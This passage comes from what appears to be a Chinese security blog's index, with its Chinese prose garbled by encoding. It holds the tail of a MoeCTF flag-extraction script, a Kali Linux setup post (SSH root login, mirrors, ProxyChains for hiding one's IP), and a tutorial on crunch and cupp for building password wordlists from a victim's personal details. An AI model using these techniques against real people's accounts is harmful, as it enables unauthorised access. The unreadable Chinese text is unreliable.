punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token comment"># print(response.text)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><img src="spider_2.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinuxÁöÑÂü∫Êú¨ÈÖçÁΩÆ</title>
      <link href="/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p>Ëµ∑Âõ†ÊòØÊàëÁöÑkaliËôöÊãüÊú∫Á™ÅÁÑ∂Â¥©Ê∫É‰∫ÜÔºåÊü•‰∫ÜÂæàÂ§öËµÑÊñô‰πüÈÉΩÊòØÊé®ËçêÈáçË£ÖÔºå‰πüÊ≤°ÊúâÂæàÈáçË¶ÅÁöÑ‰∏úË•øÔºå‰ΩÜ‰∏Ä‰∫õÂü∫Êú¨ÈÖçÁΩÆËøòÊòØÈúÄË¶ÅÁöÑ</p><p>Ëá≥‰∫é‰∏ãËΩΩÂÆâË£ÖÁΩë‰∏äÊïôÁ®ãÂæàÂ§öÔºåÂ§ßÈÉ®ÂàÜÈÉΩÊòØË∑üÁùÄÈªòËÆ§ÈÄâÈ°πÂç≥ÂèØ„ÄÇ</p><h3 id="ÁéØÂ¢ÉÈÖçÁΩÆ"><a href="#ÁéØÂ¢ÉÈÖçÁΩÆ" class="headerlink" title="ÁéØÂ¢ÉÈÖçÁΩÆ"></a>ÁéØÂ¢ÉÈÖçÁΩÆ</h3><h4 id="sshËøûÊé•"><a href="#sshËøûÊé•" class="headerlink" title="sshËøûÊé•"></a>sshËøûÊé•</h4><p>Â§ßÈÉ®ÂàÜlinuxÈÉΩÊòØÂëΩ‰ª§Ë°åÊ®°ÂºèËæÉÂ§öÔºåÊâÄ‰ª•sshËøûÊé•‰πüÈùûÂ∏∏ÈáçË¶Å</p><h5 id="ÁºñËæësshÈÖçÁΩÆÊñá‰ª∂"><a href="#ÁºñËæësshÈÖçÁΩÆÊñá‰ª∂" class="headerlink" title="ÁºñËæësshÈÖçÁΩÆÊñá‰ª∂"></a>ÁºñËæësshÈÖçÁΩÆÊñá‰ª∂</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span class="token comment"># ËøôÈáåÊàë‰ΩøÁî®ÁöÑÁºñËæëÂô®ÊòØvim ÂÖ∂‰ªñ‰πüÂèØ‰ª•</span></code></pre><p><img src="ssh.png" loading="lazy"></p><p>Â∞Ü<code>PermitRootLogin</code>ÂêéÁöÑÂÜÖÂÆπÊîπ‰∏∫<code>yes</code>Âπ∂ÂèñÊ∂àÂíå<code>PubkeyAuthentication</code>ÂâçÈù¢ÁöÑÊ≥®Èáä</p><h5 id="ÈáçÂêØsshÊúçÂä°"><a href="#ÈáçÂêØsshÊúçÂä°" class="headerlink" title="ÈáçÂêØsshÊúçÂä°"></a>ÈáçÂêØsshÊúçÂä°</h5><pre class="language-bash" data-language="bash"><code class="language-bash">/etc/init.d/ssh restart</code></pre><h5 id="sshÊúçÂä°Ëá™ÂêØ"><a href="#sshÊúçÂä°Ëá™ÂêØ" class="headerlink" title="sshÊúçÂä°Ëá™ÂêØ"></a>sshÊúçÂä°Ëá™ÂêØ</h5><pre class="language-bash" data-language="bash"><code class="language-bash">update-rc.d <span class="token function">ssh</span> <span class="token builtin class-name">enable</span></code></pre><h5 id="sshËøûÊé•-1"><a href="#sshËøûÊé•-1" class="headerlink" title="sshËøûÊé•"></a>sshËøûÊé•</h5><p>È¶ñÂÖà‰ΩøÁî®<code>ifconfig</code>Êü•ÁúãËá™Â∑±ÁöÑIPÂú∞ÂùÄÔºåËøôÈáåÊàë‰ΩøÁî®ÁöÑÊòØXshell</p><p><img src="ssh_2.png" loading="lazy"></p><p>‰∏ªÊú∫Â°´ÂÜôËá™Â∑±Êü•ËØ¢Âá∫Êù•ÁöÑIPÔºåÁ´ØÂè£‰∏∫22(linux‰∏ÄËà¨ÈªòËÆ§ÈÉΩÊòØ22)</p><p><img src="ssh_3.png" loading="lazy"></p><p>ÁÑ∂ÂêéÂ°´ÂÜôËá™Â∑±ÁöÑÁî®Êà∑ÂØÜÁ†ÅËøûÊé•</p><h4 id="Êõ¥Êç¢ÂõΩÂÜÖÈïúÂÉèÊ∫ê"><a href="#Êõ¥Êç¢ÂõΩÂÜÖÈïúÂÉèÊ∫ê" class="headerlink" title="Êõ¥Êç¢ÂõΩÂÜÖÈïúÂÉèÊ∫ê"></a>Êõ¥Êç¢ÂõΩÂÜÖÈïúÂÉèÊ∫ê</h4><p>Áî±‰∫éÊüê‰∫õÂéüÂõ†ÔºåÂØºËá¥ÈÄöËøáÂÆòÊñπÈïúÂÉèÊ∫ê‰∏ãËΩΩÈÄüÂ∫¶ÂèòÊÖ¢ÔºåËøôÊó∂Êàë‰ª¨ÂèØ‰ª•Â∞ÜÊ∫ê‰øÆÊîπ‰∏∫ÂõΩÂÜÖÁöÑÈïúÂÉèÊ∫ê„ÄÇËøôÊ†∑ÂÅöÊúâÂæàÂ§öÂ•ΩÂ§ÑÔºåÊØîÂ¶ÇÊèêÈ´ò‰∏ãËΩΩÈÄüÂ∫¶ÔºåÊèêÈ´òÁ®≥ÂÆöÊÄßÔºåÂõΩÂÜÖÈïúÂÉèÊ∫êÂú®ÂõΩÂÜÖËÆøÈóÆÊõ¥‰∏∫È°∫ÁïÖÔºå‰∏çÂÆπÊòìÂá∫Áé∞ÁΩëÁªúÊ≥¢Âä®ÂØºËá¥ÁöÑ‰∏ãËΩΩÂ§±Ë¥•ÔºõÂáèÂ∞ëÂª∂ËøüÔºåËÆøÈóÆÊú¨Âú∞ÈïúÂÉèÊ∫êÂèØ‰ª•ÊúâÊïàÂáèÂ∞ëÁΩëÁªúÂª∂ËøüÔºåÊèêÂçáÁ≥ªÁªüÊõ¥Êñ∞ÂíåËΩØ‰ª∂ÂÆâË£ÖÁöÑÊïàÁéá„ÄÇ</p><h5 id="ÁºñËæëaptÈÖçÁΩÆÊñá‰ª∂"><a href="#ÁºñËæëaptÈÖçÁΩÆÊñá‰ª∂" class="headerlink" title="ÁºñËæëaptÈÖçÁΩÆÊñá‰ª∂"></a>ÁºñËæëaptÈÖçÁΩÆÊñá‰ª∂</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/apt/sources.list</code></pre><h5 id="ÊõøÊç¢ÂõΩÂÜÖÊ∫ê"><a href="#ÊõøÊç¢ÂõΩÂÜÖÊ∫ê" class="headerlink" title="ÊõøÊç¢ÂõΩÂÜÖÊ∫ê"></a>ÊõøÊç¢ÂõΩÂÜÖÊ∫ê</h5><p>Ê≥®ÈáäÊéâÂÆòÊñπÊ∫êÔºåÊåëÈÄâ‰ªªÊÑèÊ∫êÂä†ÂÖ•Âç≥ÂèØ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ÈòøÈáå‰∫ë</span>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span class="token comment"># Ê∏ÖÂçéÂ§ßÂ≠¶</span>deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free<span class="token comment"># ‰∏≠ÁßëÂ§ß</span>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h5 id="Êõ¥Êñ∞"><a href="#Êõ¥Êñ∞" class="headerlink" title="Êõ¥Êñ∞"></a>Êõ¥Êñ∞</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update  <span class="token comment"># Êõ¥Êñ∞Ê∫ê</span><span class="token function">apt</span> upgrade <span class="token comment"># ÊµãËØïÈïúÂÉèÊ∫ê</span></code></pre><h4 id="ÂÆâË£ÖËæìÂÖ•Ê≥ï"><a href="#ÂÆâË£ÖËæìÂÖ•Ê≥ï" class="headerlink" title="ÂÆâË£ÖËæìÂÖ•Ê≥ï"></a>ÂÆâË£ÖËæìÂÖ•Ê≥ï</h4><p>ËøôÈáå‰ª•ibusËæìÂÖ•Ê≥ï‰∏∫‰æã</p><p>ÂÆâË£ÖËæìÂÖ•Ê≥ïÊ°ÜÊû∂</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ibus ibus-pinyin</code></pre><p>ÁÑ∂ÂêéÈáçÂêØ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">reboot</span></code></pre><p>ÁÑ∂ÂêéÈÖçÁΩÆibusÊ∑ªÂä†‰∏≠ÊñáÂç≥ÂèØ</p><h4 id="ÈÖçÁΩÆ‰ª£ÁêÜ"><a href="#ÈÖçÁΩÆ‰ª£ÁêÜ" class="headerlink" title="ÈÖçÁΩÆ‰ª£ÁêÜ"></a>ÈÖçÁΩÆ‰ª£ÁêÜ</h4><p>Kali‰∏≠ÂÜÖÁΩÆ‰∫ÜProxyChainsÂºÄÊ∫ê‰ª£ÁêÜÂ∑•ÂÖ∑ÔºåÈÄöËøá‰ΩøÁî®Ëøô‰∏™Â∑•ÂÖ∑ÔºåÂèØ‰ª•ËÆ©Êàë‰ª¨ÈöêËóèÁúüÂÆûipÂÆûÁé∞ÊîªÂáª„ÄÅ‰ª£ÁêÜ‰∏äÁΩëÁ≠â</p><p>‰ΩøÁî®<code>ProxyChains</code>ÔºåÁî®Êà∑ÂèØ‰ª•Âú®Kali Linux‰∏≠ÈÖçÁΩÆ‰∏çÂêåÁ±ªÂûãÁöÑ‰ª£ÁêÜÊúçÂä°Âô®ÔºåÂåÖÊã¨<code>HTTP</code>„ÄÅ<code>SOCKS4</code>Âíå<code>SOCKS5</code>‰ª£ÁêÜ„ÄÇÊ≠§Â§ñÔºåÁî®Êà∑ËøòÂèØ‰ª•‰∏∫‰∏çÂêåÁöÑÁõÆÊ†áÊåáÂÆö‰∏çÂêåÁöÑ‰ª£ÁêÜÊúçÂä°Âô®Ôºå‰ª•Á°Æ‰øù‰ªñ‰ª¨ÁöÑË°å‰∏∫‰∏çË¢´Ê£ÄÊµãÂà∞ÊàñË∑üË∏™„ÄÇ</p><h5 id="ÁºñËæëÈÖçÁΩÆÊñá‰ª∂"><a href="#ÁºñËæëÈÖçÁΩÆÊñá‰ª∂" class="headerlink" title="ÁºñËæëÈÖçÁΩÆÊñá‰ª∂"></a>ÁºñËæëÈÖçÁΩÆÊñá‰ª∂</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf</code></pre><p><img src="proxy.png" loading="lazy"></p><p>Ê≥®Èáä<code>strict_chain</code></p><p>ÂèñÊ∂à<code>dynamic_chain</code>ÁöÑÊ≥®Èáä</p><p>ÁÑ∂ÂêéÁßªËá≥ÊúÄÂêé‰∏ÄË°åÔºåÂ°´ÂÜôÂØπÂ∫îIPÂíåÁ´ØÂè£</p><p>ÊàëËøôÈáå‰ΩøÁî®ÁöÑÊòØclash for WindowsÔºåËôöÊãüÊú∫ÈááÁî®NATËøûÊé•</p><p>È¶ñÂÖàÂú®Windows cmd‰∏ã<code>ipconfig</code>ÔºåÊü•ËØ¢NATÊ®°ÂºèÁöÑIP</p><p><img src="proxy_2.png" loading="lazy"></p><p><img src="proxy_3.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">socks4 <span class="token number">192.168</span>.2.1 <span class="token number">7890</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ÊäÄÊúØÁ¨îËÆ∞ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux </tag>
            
            <tag> ÁéØÂ¢ÉÊê≠Âª∫ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Â≠óÂÖ∏ÁîüÊàê‰∏éÂØÜÁ†ÅÁàÜÁ†¥</title>
      <link href="/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2024/08/08/%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E4%B8%8E%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="Â≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑"><a href="#Â≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑" class="headerlink" title="Â≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑"></a>Â≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑</h3><h4 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h4><h5 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h5><pre class="language-http" data-language="http"><code class="language-http"># Ê∫êÁ†Å<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//github.com/crunchsec/crunch</span></span></code></pre><p><strong>Crunch</strong>‰∏∫<strong>kali</strong>Ëá™Â∏¶Â∑•ÂÖ∑‰πã‰∏ÄÔºåÊòØ‰∏ÄÁßçËá™ÂÆö‰πâÂàõÂª∫ÂØÜÁ†ÅÂ≠óÂÖ∏Â∑•ÂÖ∑ÔºåÊåâÁÖßÊåáÂÆöÁöÑËßÑÂàôÁîüÊàêÂØÜÁ†ÅÂ≠óÂÖ∏ÔºåÂèØ‰ª•ÈíàÂØπÊÄßÁöÑÁîüÊàêÂ≠óÂÖ∏Êñá‰ª∂</p><h5 id="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞"><a href="#‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞" class="headerlink" title="‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞"></a>‰ΩøÁî®ËØ≠Ê≥ïÂíåÂèÇÊï∞</h5><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token operator">&lt;</span>min<span class="token operator">></span> <span class="token operator">&lt;</span>max<span class="token operator">></span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span></code></pre><p>ÂèÇÊï∞ËØ¶Ëß£</p><pre class="language-bash" data-language="bash"><code class="language-bash">min    ËÆæÂÆöÊúÄÂ∞èÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÔºàÂøÖÈÄâÔºâmax    ËÆæÂÆöÊúÄÂ§ßÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶ÔºàÂøÖÈÄâÔºâoprions<span class="token parameter variable">-b</span>     ÊåáÂÆöÊñá‰ª∂ËæìÂá∫ÁöÑÂ§ßÂ∞èÔºåÈÅøÂÖçÂ≠óÂÖ∏Êñá‰ª∂ËøáÂ§ß  <span class="token parameter variable">-c</span>     ÊåáÂÆöÊñá‰ª∂ËæìÂá∫ÁöÑË°åÊï∞ÔºåÂç≥ÂåÖÂê´ÂØÜÁ†ÅÁöÑ‰∏™Êï∞<span class="token parameter variable">-d</span>     ÈôêÂà∂Áõ∏ÂêåÂÖÉÁ¥†Âá∫Áé∞ÁöÑÊ¨°Êï∞<span class="token parameter variable">-e</span>     ÂÆö‰πâÂÅúÊ≠¢Â≠óÁ¨¶ÔºåÂç≥Âà∞ËØ•Â≠óÁ¨¶‰∏≤Â∞±ÂÅúÊ≠¢ÁîüÊàê<span class="token parameter variable">-f</span>     Ë∞ÉÁî®Â∫ìÊñá‰ª∂Ôºà/etc/share/crunch/charset.lstÔºâ<span class="token parameter variable">-i</span>     ÊîπÂèòËæìÂá∫Ê†ºÂºèÔºåÂç≥aaa,aab -<span class="token operator">></span> aaa,baa<span class="token parameter variable">-I</span>     ÈÄöÂ∏∏‰∏é-tËÅîÂêà‰ΩøÁî®ÔºåË°®ÊòéËØ•Â≠óÁ¨¶‰∏∫ÂÆû‰πâÂ≠óÁ¨¶<span class="token parameter variable">-m</span>     ÈÄöÂ∏∏‰∏é-pÊê≠ÈÖç<span class="token parameter variable">-o</span>     Â∞ÜÂØÜÁ†Å‰øùÂ≠òÂà∞ÊåáÂÆöÊñá‰ª∂<span class="token parameter variable">-p</span>     ÊåáÂÆöÂÖÉÁ¥†‰ª•ÁªÑÂêàÁöÑÊñπÂºèËøõË°å<span class="token parameter variable">-q</span>     ËØªÂèñÂØÜÁ†ÅÊñá‰ª∂ÔºåÂç≥ËØªÂèñpass.txt<span class="token parameter variable">-r</span>     ÂÆö‰πâÈáçÊüê‰∏ÄÂ≠óÁ¨¶‰∏≤ÈáçÊñ∞ÂºÄÂßã<span class="token parameter variable">-s</span>     ÊåáÂÆö‰∏Ä‰∏™ÂºÄÂßãÁöÑÂ≠óÁ¨¶ÔºåÂç≥‰ªéËá™Â∑±ÂÆö‰πâÁöÑÂØÜÁ†ÅxxxxÂºÄÂßã<span class="token parameter variable">-t</span>     ÊåáÂÆöÂØÜÁ†ÅËæìÂá∫ÁöÑÊ†ºÂºè<span class="token parameter variable">-u</span>     Á¶ÅÊ≠¢ÊâìÂç∞ÁôæÂàÜÊØîÔºàÂøÖÈ°ª‰∏∫ÊúÄÂêé‰∏Ä‰∏™ÈÄâÈ°πÔºâ<span class="token parameter variable">-z</span>     ÂéãÁº©ÁîüÊàêÁöÑÂ≠óÂÖ∏Êñá‰ª∂ÔºåÊîØÊåÅgzip,bzip2,lzma,7z  </code></pre><p>ÁâπÊÆäÂ≠óÁ¨¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">%      ‰ª£Ë°®Êï∞Â≠ó^      ‰ª£Ë°®ÁâπÊÆäÁ¨¶Âè∑@      ‰ª£Ë°®Â∞èÂÜôÂ≠óÊØç,      ‰ª£Ë°®Â§ßÂÜôÂ≠óÁ¨¶   </code></pre><h5 id="ÂÆûË∑µÊ°à‰æã"><a href="#ÂÆûË∑µÊ°à‰æã" class="headerlink" title="ÂÆûË∑µÊ°à‰æã"></a>ÂÆûË∑µÊ°à‰æã</h5><p>1.ÁîüÊàêÊúÄÂ∞è‰∏∫5,ÊúÄÂ§ß‰∏∫6ÔºåÁî®Ëá™Â∑±ÊåáÂÆöÁöÑÂ≠óÁ¨¶abcdef(ÈªòËÆ§‰∏∫26‰∏™Â∞èÂÜôÂ≠óÊØç‰∏∫ÂÖÉÁ¥†ÁöÑÊâÄÊúâÁªÑÂêà)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdef</code></pre><p>2.ÁîüÊàêÊúÄÂ∞è‰∏∫5,ÊúÄÂ§ß‰∏∫6ÔºåÁî±abcdefgÂíåÁ©∫Ê†º‰∏∫ÂÖÉÁ¥†ÁöÑÊâÄÊúâÁªÑÂêà(&#x2F;‰ª£Ë°®Á©∫Ê†º)</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">5</span> <span class="token number">6</span> abcdefg\ ÊàñËÄÖ crunch <span class="token number">5</span> <span class="token number">6</span> <span class="token string">"abcdefg "</span></code></pre><p>3.Â§öÁßçÁªÑÂêà ÁîüÊàê3‰∏™ÂÖÉÁ¥†ÁöÑÁªÑÂêàÔºåÂâç‰∏â‰Ωç‰∏∫ÂÆö‰πâÁöÑÂ≠óÁ¨¶‰∏≤</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">3</span> <span class="token number">3</span> <span class="token parameter variable">-t</span> d@% <span class="token parameter variable">-p</span> aaa bbb </code></pre><p>4.ÁîüÊàêÂá†‰∏™ÂÖÉÁ¥†ÁöÑÁªÑÂêàÔºàÂèØ‰ª•Áî®‰∫éÁ§æÂ∑•‰∏≠Êî∂ÈõÜÁöÑ‰ø°ÊÅØÔºâ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token operator">-</span>p zhangsan <span class="token number">2018</span> <span class="token number">0101</span> <span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>5.ÁîüÊàêÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤ÔºàÊØîÂ¶ÇÁîüÊàêÁºñÂè∑ÔºåÊâãÊú∫Âè∑Á≠âÔºâ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">crunch <span class="token number">10</span> <span class="token number">10</span> <span class="token operator">-</span>t <span class="token number">201800</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span><span class="token operator">%</span></code></pre><p><img src="crunch.png" loading="lazy"></p><p>6.ÈÄöËøá-lÂèÇÊï∞Êù•‰Ωø@,%^Á≠âÁâπÊÆäÂ≠óÁ¨¶ËæìÂá∫</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">7</span> <span class="token number">7</span> <span class="token parameter variable">-t</span> p@ss,%^ <span class="token parameter variable">-l</span> a@aaaaa</code></pre><p>7.-oÂèÇÊï∞‰πüÂèØ‰ΩøÁî®&gt;&gt;Êù•ÁÆÄÂåñ</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-d</span> <span class="token number">2</span>@ <span class="token parameter variable">-t</span> @@@% <span class="token operator">>></span> test.txt</code></pre><h5 id="Ë∞ÉÁî®ÂØÜÁ†ÅÂ∫ì"><a href="#Ë∞ÉÁî®ÂØÜÁ†ÅÂ∫ì" class="headerlink" title="Ë∞ÉÁî®ÂØÜÁ†ÅÂ∫ì"></a>Ë∞ÉÁî®ÂØÜÁ†ÅÂ∫ì</h5><p><img src="crunch_2.png" loading="lazy"></p><p>ÁâπÊÆäÂ≠óÁ¨¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">numeric     Ë°®Á§∫0123456789Lalpha      Ë°®Á§∫26‰ΩçÂ∞èÂÜôÂ≠óÊØçUalpha      Ë°®Á§∫26‰ΩçÂ§ßÂÜôÂ≠óÊØç</code></pre><p>ÂÆû‰æãÔºöË∞ÉÁî®ÂØÜÁ†ÅÂ∫ì charset.lst‰∏≠ÁöÑ hex-upperÈ°πÁõÆÂ≠óÁ¨¶ÔºåÁîüÊàê4‰ΩçÂØÜÁ†ÅÔºåÂÖ∂‰∏≠Ê†ºÂºè‰∏∫@ + hex-upper +% +%</p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">4</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> charset.lst hex-upper <span class="token parameter variable">-t</span> @@%% <span class="token parameter variable">-l</span> @aaa</code></pre><h4 id="cupp-ccupp"><a href="#cupp-ccupp" class="headerlink" title="cupp(ccupp)"></a>cupp(ccupp)</h4><h5 id="ÁÆÄ‰ªã-1"><a href="#ÁÆÄ‰ªã-1" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h5><p>cuppÊòØ‰∏ÄÊ¨æÂü∫‰∫épythonÁºñÂÜôÁöÑÂèØ‰∫§‰∫íÊÄßÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÁîüÊàêÂ∑•ÂÖ∑„ÄÇÁªìÂêàÁ§æ‰ºöÂ∑•Á®ãÂ≠¶Ôºå‰Ω†‰ºöËé∑Âæó‰∏Ä‰ªΩÊ†πÊçÆ‰∏™‰∫∫‰ø°ÊÅØÁîüÊàêÁöÑ‰∏ìÂ±ûÂ≠óÂÖ∏„ÄÇ</p><p>‰∏é‰º†ÁªüÂ≠óÂÖ∏Áõ∏ÊØîÔºåÂÖ∂‰ºòÂäøÂú®‰∫éÂáÜÁ°ÆÁéáÊõ¥È´ò</p><h5 id="cuppÂ∏∏Áî®ÂëΩ‰ª§"><a href="#cuppÂ∏∏Áî®ÂëΩ‰ª§" class="headerlink" title="cuppÂ∏∏Áî®ÂëΩ‰ª§"></a>cuppÂ∏∏Áî®ÂëΩ‰ª§</h5><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-h</span>Â∏∏ÁúãÂ∏ÆÂä©‰ø°ÊÅØ<span class="token parameter variable">-i</span>ÈÄöËøáÂ°´ÂÜô‰ø°ÊÅØÂàõÂª∫Áî®Êà∑ÂØÜÁ†ÅÂ≠óÂÖ∏<span class="token parameter variable">-w</span>Âú®Â∑≤Â≠òÂú®ÁöÑÂ≠óÂÖ∏ËøõË°åÊâ©Â±ï<span class="token parameter variable">-l</span>‰ªégithub‰ªìÂ∫ì‰∏ãËΩΩÂ≠óÂÖ∏<span class="token parameter variable">-v</span>Êü•ÁúãÁâàÊú¨‰ø°ÊÅØ<span class="token parameter variable">-q</span>ÂÆâÈùôÊ®°Âºè</code></pre><h5 id="ÁîüÊàêÂ≠óÂÖ∏"><a href="#ÁîüÊàêÂ≠óÂÖ∏" class="headerlink" title="ÁîüÊàêÂ≠óÂÖ∏"></a>ÁîüÊàêÂ≠óÂÖ∏</h5><ol><li><p>ËøêË°åÂëΩ‰ª§‚Äùcupp -i‚Äù,Â°´ÂÜôÂèóÂÆ≥‰∫∫Âßì„ÄÅÂêç„ÄÅÁª∞Âè∑„ÄÅÁîüÊó•„ÄÇ</p></li><li><p>Â°´ÂÜôÂèóÂÆ≥‰∫∫ÈÖçÂÅ∂ÁöÑÂêçÂ≠ó„ÄÅÁª∞Âè∑„ÄÅÁîüÊó•</p></li><li><p>Â°´ÂÜôÂ≠©Â≠êÁöÑÂêçÂ≠ó„ÄÅÁª∞Âè∑„ÄÅÁîüÊó•</p></li><li><p>Â°´ÂÜôÂÆ†Áâ©ÁöÑÂêçÂ≠ó‰ª•ÂèäÂÖ¨Âè∏ÁöÑÂêçÂ≠ó</p></li><li><p>ÊòØÂê¶Ê∑ªÂä†‰∏Ä‰∫õÂÖ≥‰∫éÂèóÂÆ≥‰∫∫ÁöÑÂÖ≥ÈîÆËØç</p></li><li><p>ÊòØÂê¶Âú®ÂØÜÁ†ÅÁªìÂ∞æÊ∑ªÂä†‰∏Ä‰∫õÁâπÊÆäÂ≠óÁ¨¶</p></li><li><p>ÊòØÂê¶Âú®ÂØÜÁ†ÅÁªìÂ∞æÊ∑ªÂä†‰∏Ä‰∫õÈöèÊú∫Êï∞Â≠ó</p></li><li><p>Â°´ÂÜô‚Äùy‚ÄùÔºåÁîüÊàêÂ≠óÂÖ∏ÔºåÂèØ‰ª•Âú®rootÁõÆÂΩï‰∏ãÊü•Áúã</p></li></ol><p>ËøêË°åÂëΩ‰ª§ ‚Äúcupp -l‚Äù ,Â°´ÂÜô‰Ω†ÊÉ≥Ë¶Å‰∏ãËΩΩÂ≠óÂÖ∏ÁöÑÂ∫èÂè∑Ôºå‰∏ãËΩΩÂÆåÊàêÁöÑÂ≠óÂÖ∏‰øùÂ≠òÂú®‚Äù&#x2F;root&#x2F;dictionaries&#x2F;chinese‚ÄùÁõÆÂΩï‰∏ã„ÄÇ</p><h3 id="ÁàÜÁ†¥Â∑•ÂÖ∑"><a href="#ÁàÜÁ†¥Â∑•ÂÖ∑" class="headerlink" 